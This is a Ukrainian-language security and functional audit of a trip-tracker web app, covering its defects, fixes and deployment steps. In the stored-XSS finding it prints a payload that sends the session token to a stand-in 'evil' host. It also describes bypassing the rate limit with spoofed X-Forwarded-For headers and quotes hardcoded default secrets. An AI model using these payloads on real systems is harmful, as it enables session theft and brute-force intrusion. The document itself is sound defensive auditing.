## 1. Резюме

Застосунок функціонально робочий: SQL-ін'єкцій немає (усі запити параметризовані), пароль порівнюється через `timingSafeEqual`/bcrypt, у продакшн-режимі є fail-fast перевірка секретів, є graceful shutdown і WAL.

Але є **5 блокуючих дефектів**, через які застосунок зараз не можна вважати ні безпечним, ні коректним:

| # | Дефект | Категорія | Підтверджено |

| 1 | `index.html` пошкоджено — весь інтерфейс у «кракозябрах» | UI | скріншот |

## 2. Критичні (P0) — виправляти негайно

### P0-1. `index.html` повністю пошкоджено (mojibake + BOM)

`public/index.html` — це подвійно перекодований файл: UTF-8 байти прочитано як cp1251 і знову збережено в UTF-8. Плюс додано BOM (`EF BB BF`).

```
00000050: 7020 5472 6163 6b65 7220 d0b2 d082 e280  p Tracker ......
```
`d0b2 d082` = «вЂ» — класична ознака подвійного перекодування.

Наслідок: **усі** заголовки, кнопки, підказки, `placeholder` і емодзі нечитабельні. Скріншот екрана входу підтверджує: замість «Вхід в систему» — `Р’С…С–Рґ РІ СЃРёСЃС‚РµРјСѓ`.

Це регресія у робочій копії (`git diff` показує, що в останньому коміті текст був коректним):

```bash
git checkout -- public/index.html   # повернути коректну версію
```
Після цього **вручну перенести** зміни, які були зроблені в пошкодженій версії (у diff видно лише `?v=3 → ?v=4`).

Також у `public/sw.js:1` і `:16` — BOM і такий самий mojibake у `console.warn`.

### P0-2. Stored XSS через назву рейсу → повний захват акаунта

`public/app.js:1028` і `:1366`:

```js
onclick="openCompleteTripModal(${activeTrip.id}, '${escapeHtml(activeTrip.name).replace(/'/g, "\\'")}')"
```

`escapeHtml` перетворює `'` у `&#39;`, тому наступний `.replace(/'/g, "\\'")` — мертвий код. Але HTML-парсер **декодує** `&#39;` назад у `'` ще до компіляції JS-обробника. Тобто лапка повертається.

Перевірено на живому застосунку. Рейс із назвою:

```
X');fetch('//evil'+localStorage.trip_token);//
```

дає в DOM:

```html
onclick="openCompleteTripModal(1, 'X');fetch('//evil'+localStorage.trip_token);//')"
```

Оскільки JWT лежить у `localStorage` (див. P0-3), це одна дія — повна компрометація сесії. Той самий патерн у `renderTripsReport`.

**Виправлення:** не збирати `onclick` рядками. Вішати обробник через `addEventListener` і передавати дані через `dataset`:

```js
btn.dataset.tripId = trip.id;
btn.addEventListener('click', () => openCompleteTripModal(Number(btn.dataset.tripId), trip.name));
```
Це заодно знімає потребу в `'unsafe-inline'` для CSP.

### P0-3. JWT у `localStorage`, 30 днів, без відкликання

`app.js:2`, `app.js:113`, `server.js:300`.

- Токен доступний будь-якому JS на сторінці → будь-яка XSS (P0-2) = витік токена.
- `expiresIn: '30d'` — вкрадений токен живе місяць.
- `handleLogout()` лише чистить `localStorage`; на сервері токен залишається дійсним.
- У токені лише `{ role: 'admin' }`, без `jti`/`sub` — немає ні ідентифікації, ні можливості відкликати.

**Виправлення:** httpOnly + `Secure` + `SameSite=Strict` cookie; access-token 15 хв + refresh; endpoint `/api/logout` з інвалідацією (таблиця `sessions` або версія токена в БД).

### P0-4. `.env` не завантажується — секрети тихо падають у дефолтні

У `package.json` немає `dotenv`, у `server.js` немає `require('dotenv').config()`. Але `.env.example` існує і пропонує створити `.env`.

Наслідок: `npm start` з коректно заповненим `.env` **ігнорує його**. `NODE_ENV` лишається невизначеним → `IS_PROD = false` → застосовуються:

```js
const JWT_SECRET = 'dev_jwt_secret_key_trip_tracker_123';  // server.js:14
const ADMIN_PASSWORD = 'admin123';                          // server.js:15
```

`dev_jwt_secret_key_trip_tracker_123` є в репозиторії → будь-хто може підробити валідний токен і зайти без пароля. Це найнебезпечніший сценарій розгортання «за інструкцією».

**Виправлення:** додати `dotenv` (або `node --env-file=.env`), а дефолтні секрети прибрати зовсім — нехай застосунок падає, якщо змінних немає, в будь-якому режимі.

### P0-5. Rate-limit обходиться підробленим `X-Forwarded-For`

`server.js:27` — `app.set('trust proxy', 1)` встановлено безумовно, а `getClientIp` (`server.js:208`) додатково фолбечить на сирий заголовок:

```js
return req.ip || req.headers['x-forwarded-for'] || ...;
```

Якщо застосунок виставлений у мережу напряму (типовий `docker run -p 8851:8851`), `req.ip` береться з `X-Forwarded-For`. Перевірка:

```
5 спроб з одного IP      → 401 401 401 401 401 429   (ліміт працює)
6 спроб з XFF: 9.9.9.1..6 → 401 401 401 401 401 401   (ліміт обійдено)
```

Оскільки єдиний credential — це один спільний пароль адміністратора, обхід ліміту = вільний brute-force.

**Виправлення:** `trust proxy` вмикати лише за явним `TRUST_PROXY` env; ключем лімітера брати `req.socket.remoteAddress`; додати глобальний ліміт й експоненційну затримку.

## 3. Високі (P1)

### P1-1. Редагування запису нищить прив'язку до доставки

`app.js:662-674` — `saveEdit()` не надсилає `trip_id` і `delivery_id`. Сервер (`server.js:739`) робить `delivery_id = ?` з `delivery_id || null`:

```sql
SET ... delivery_id = ?   -- null
```

Перевірено: після `PUT /api/records/1` запис отримав `delivery_id: null`, хоча доставка досі посилається на нього як на `load_record_id`.

Наслідок у звіті (скріншот підтверджує): доставка показується як «🚚 В дорозі · Звіт ⏳ 0/0», а сам запис переїхав у блок «Записи поза доставками». Тобто **будь-яке виправлення коментаря або одометра ламає ієрархію звіту**, і повернути запис у доставку через UI неможливо.

**Виправлення:** у `saveEdit` передавати наявні `trip_id`/`delivery_id` (вони вже є в `recordsCache`), а на сервері використовувати `COALESCE(?, delivery_id)` замість безумовного присвоєння.

### P1-2. Таблиця записів зсунута на одну колонку

`index.html:223-234` — 11 `<th>`, включно з «Рейс / Доставка».
`app.js:547-573` — `renderTableRow` повертає **10** `<td>`, без клітинки рейсу/доставки.

Перевірено в DOM: `headerCols: 11`, `rowCells: 10`. Текст рядка:

```
#1 | 2026-10-17 | 09:06 | 1001 км | Загрузка | Київ | edited | - | ⏳ Ні | ✏️ 🗑️
```

«edited» (коментар) стоїть під заголовком «Рейс / Доставка», а «-» (GPS) — під «Коментар». Уся права частина таблиці зсунута, дані читаються неправильно. Порожній стан теж має `colspan="10"` замість 11.

### P1-3. Toast не видно на вкладках «Рейси», «Таблиця», «Графіки»

`showToast` (`app.js:382`) пише в `#msg`, а `#msg` лежить **усередині** `<div id="tabForm">` (`index.html:149`). `switchTab` ховає `#tabForm` через `display:none`.

Перевірено: `msgVisibleOnReportTab: false`. Тобто після «Почати рейс» або «Завершити рейс» користувач не бачить ані успіху, ані помилки сервера — тільки мовчазну зміну стану.

### P1-4. Кнопка «Редагувати» у звіті не працює

`openEditModalById` (`app.js:638`) бере запис із `recordsCache`, а `loadTripsReport` (`app.js:1260`) **не** наповнює цей кеш (на відміну від мертвої `loadShiftsReport`).

Перевірено у свіжій сесії: після переходу одразу на «Рейси» клік по ✏️ залишає `editModal.style.display === ""` — модалка не відкривається, помилки немає. Працює лише якщо до цього відкрити вкладку «Таблиця».

### P1-5. Записи без активного рейсу зникають зі звіту

`server.js:411-434` — `/api/trips/:id/details` вибирає `WHERE trip_id = ?`. `renderTripsReport` ітерує лише рейси.

Якщо водій створює запис, коли активного рейсу немає (`targetTripId = null`, `server.js:495-498`), запис зберігається з `trip_id = NULL` і **не потрапляє в жоден звіт** — його видно тільки в таблиці. При цьому сервер повертає `warning`, який фронтенд ігнорує (`app.js:446-449` перевіряє лише `data.success`).

### P1-6. Зовнішні ключі не працюють — `ON DELETE CASCADE`/`SET NULL` інертні

SQLite має `PRAGMA foreign_keys = OFF` за замовчуванням, а `server.js` його ніде не вмикає.

Наслідки:
- `records.trip_id ... ON DELETE SET NULL`, `deliveries.trip_id ... ON DELETE CASCADE` — ніколи не спрацьовують.
- `deliveries.load_record_id` / `unload_record_id` взагалі не мають `REFERENCES`.
- `DELETE /api/records/:id` не перевіряє, чи запис є початком/кінцем доставки → доставка назавжди лишається «В дорозі» з порожніми локаціями, і закрити її нічим.

**Виправлення:** `db.pragma('foreign_keys = ON')` + додати `REFERENCES` для `load_record_id`/`unload_record_id` + каскадна логіка в `DELETE`.

### P1-7. Немає CSP; `X-XSS-Protection` застарілий

`server.js:179-185` виставляє `X-XSS-Protection: 1; mode=block` (застарілий, у старих IE створює вразливості) і не виставляє `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`.

Через відсутність CSP XSS з P0-2 нічим не стримується. Додатково `app.disable('x-powered-by')` не викликано — `X-Powered-By: Express` видно у відповіді.

### P1-8. Внутрішні помилки віддаються клієнту

Близько 15 обробників роблять `res.status(500).json({ error: err.message })` (`server.js:334, 351, 380, 406, 431, 561, 661, 749, 766, 787, 801, 832`).

Перевірено: `POST /api/records/bulk-import` з `{"rawText":{"a":1}}` → `{"error":"rawText.trim is not a function"}`. Так само назовні підуть тексти помилок SQLite зі схемою таблиць.

### P1-9. Імпорт обходить будь-яку валідацію

`server.js:604-663` не викликає `validateRecordInput`. Перевірено — успішно імпортовано:

```
date: "abc",       time: "99:99"
date: "2026-13-45", time: "25:99"
```

Такі рядки ламають сортування (сортування рядків), аналітику та звіти. Крім того:
- `targetTripId = active ? active.id : 1` (`:611`) — жорсткий фолбек на рейс #1, якого може не існувати;
- імпорт не створює доставок для пар «Загрузка/Вигрузка», хоча міграція в `server.js:133-170` це робить → імпортована історія вся падає в «поза доставками»;
- немає дедуплікації — повторний імпорт дублює все.

### P1-10. `is_reported: "0"` зберігається як `1`

`server.js:488`, `:732`, `:757`, `:776`: `const isReportedVal = is_reported ? 1 : 0;`

Рядок `"0"` — truthy. Перевірено: запис із `"is_reported":"0"` отримав `is_reported: 1`. UI надсилає числа, але API відкритий і брехливий.

### P1-11. Завершення рейсу не закриває відкриті доставки

`server.js:385-408` оновлює лише `trips`. Усі `deliveries` зі `status='in_transit'` лишаються такими назавжди; у звіті завершений рейс показує «🚚 В дорозі». Також немає перевірки поточного статусу — повторне завершення повертає `success`.

### P1-12. Offline-черга: записи потрапляють у чужий рейс

`app.js:427-435` кладе в чергу payload **без** `trip_id`. `syncOfflineQueue` (`:356`) відправляє його пізніше, і сервер підставляє **активний на момент синхронізації** рейс (`server.js:495`). Запис, зроблений у рейсі №5 офлайн, після появи зв'язку може піти в рейс №7.

Додатково: елемент, на який сервер відповів 4xx, лишається в черзі назавжди і повторюється при кожному `online`; при втраті відповіді після успішного запису — дубль (немає idempotency-key).

### P1-13. Немає керування рейсами та доставками

Немає `DELETE /api/trips/:id`, `PUT /api/trips/:id`, немає закриття/видалення доставки. Помилково створений рейс або хибна «Загрузка» лишаються назавжди. Для облікового застосунку це блокуючий функціональний пробіл.

## 9. Оновлення розгортання

Проєкт розгорнуто через **Portainer + Cloudflare Zero Trust Tunnel** (`https://trip.bojumbohost.pp.ua/`).

### 9.1 Порядок оновлення

1. Запуште зміни в GitHub (гілка `main`).
2. Portainer → **Stacks** → `trip-tracker` → **Pull and redeploy** (увімкніть *Re-pull image and redeploy*).
3. Перевірте змінні стека:
   - `ADMIN_PASSWORD` — обов'язкова (мін. 6 символів, краще bcrypt-хеш);
   - `JWT_SECRET` — **можна видалити**, більше не використовується;
   - `TRUST_PROXY` — залиште порожнім, якщо cloudflared ходить на контейнер із приватної адреси;
   - `HOST_BIND` — `127.0.0.1`, якщо cloudflared працює на хості (безпечніше), `0.0.0.0` — якщо це окремий контейнер.
4. Перевірте здоров'я: `curl https://trip.bojumbohost.pp.ua/api/health` → `{"status":"ok"}`.
5. Зайдіть у застосунок і **увійдіть заново** — старі токени з `localStorage` більше не діють.

### 9.2 Що варто зробити поза кодом

- **Cloudflare Access** на `trip.bojumbohost.pp.ua` (Zero Trust → Access → Application) — додатковий шар автентифікації до того, як запит дійде до контейнера. Це найдешевший спосіб прибрати публічний brute-force.
- **Не публікувати порт 8851 у інтернет.** Якщо cloudflared працює на хості — `HOST_BIND=127.0.0.1`; якщо окремим контейнером — підключіть його до тієї ж docker-мережі й приберіть `ports` зовсім.
- **Резервні копії** `data/database.sqlite` (наприклад, щоденний `sqlite3 .backup` у cron на хості). У застосунку бекапу немає.
- **Зміна пароля** — через `ADMIN_PASSWORD` + перезапуск контейнера (окремого UI немає).

### 9.3 Що залишилось як технічний борг

- `server.js` — усе ще один файл (~950 рядків). Розбиття на модулі (`routes/`, `services/`, `db/`) не робилося, щоб не ризикувати розгортанням.
- Немає автоматизованих тестів (перевірки виконувались вручну через `curl` + headless Chrome).
- Один спільний пароль на всіх — немає користувачів, ролей і журналу «хто що зробив» (є лише технічний лог запитів).
- GPS-координати зберігаються безстроково і без політики зберігання — варто визначити термін і додати очищення.
